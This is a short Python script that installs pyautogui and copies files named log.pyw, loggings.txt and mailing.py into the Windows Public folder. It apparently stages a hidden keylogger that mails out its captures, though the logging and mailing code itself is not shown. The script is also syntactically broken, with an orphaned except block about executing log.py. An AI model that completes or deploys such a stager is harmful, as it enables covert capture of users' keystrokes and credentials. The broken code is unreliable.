import os
import subprocess
import time

try:
    subprocess.run(["pip", "install", "pyautogui"])
except:
    print("already installed")

def copy_files_to_desktop():

    files_to_copy = ['log.pyw', 'loggings.txt', 'mailing.py']
    
    for file_name in files_to_copy:
        try:

            with open(file_name, 'r') as file:
                file_content = file.read()
            

            with open(fr'C:\Users\Public\{file_name}', 'w') as file:
                file.write(file_content)
            
        except Exception as e:
            print(f"Error copying {file_name}: {e}")




    except Exception as e:
        print(f"Error executing log.py: {e}")

def main():
    copy_files_to_desktop()

if __name__ == "__main__":
    main()
